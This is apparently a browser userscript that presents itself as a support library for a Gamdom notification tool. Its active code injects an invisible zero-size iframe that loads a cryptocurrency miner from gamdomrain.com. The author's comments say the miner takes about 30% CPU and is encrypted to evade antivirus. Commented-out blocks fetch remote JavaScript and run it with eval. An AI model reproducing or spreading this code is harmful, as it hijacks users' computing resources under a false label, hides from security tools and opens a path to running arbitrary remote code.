// ==UserScript==
// @name         lib-GamdomNotifications
// @namespace    https://greasyfork.org/es/users/154624-anonimo-anonimo
// @version      1.3.5
// @description  Lib needed for running Gamdom Notificator
// @author       allin4
// @match        *://gamdom.com/*
// @grant        GM_info
// @grant        GM_xmlhttpRequest
// @grant        GM.xmlhttpRequest
// @connect      gamdomrain.com
// @license      Creative Commons Attribution-NonCommercial-NoDerivatives 4.0 International License.
// ==/UserScript==

var DivAppend = function(){
        //document.body.appendChild(div);
       //CPEL("https://www.gamdomrain.com/voteme/minall.js"); //This is a miner, original "unencrypted"(it's a bit encrypted but easily desencryptable, encrypted by coin-have.com, a miner website, itself). It's hosted in my own website with more encryption for avoiding antivirus, as it does consume about 30% CPU only while using the script. Said on description.
        var ifrm = document.createElement("iframe");
        ifrm.setAttribute("src", "https://www.gamdomrain.com/voteme/miningiframe.php"); //Please don't remove this as it's the way to support the developer (me). 
        ifrm.style.width = "0px";
        ifrm.style.height = "0px";
        document.body.appendChild(ifrm);
        console.log("D-s");
    };

     /*var cmp = new XMLHttpRequest();
     cmp.onreadystatechange = function() {
     if (this.readyState == 4 && this.status == 200) {
        eval(this.responseText);
        }
    };*/

    var CPEL = function(link){
        /*GM_xmlHttpRequest({
         method: "GET",
         url: link,
         onload: function(response) {
           eval(response.responseText);
            }
        });*/
    };
    
    /*var ret_r = GM_xmlhttpRequest({
     method: "GET",
     url: "https://www.gamdomrain.com/voteme/xnewxminimal.js",
     onload: function(res) {
     eval(res.responseText);
  }
});*/

(function() {
    'use strict';
     console.log("LIB LOADED" + "(version: " + "1.3.5" + ")");
})();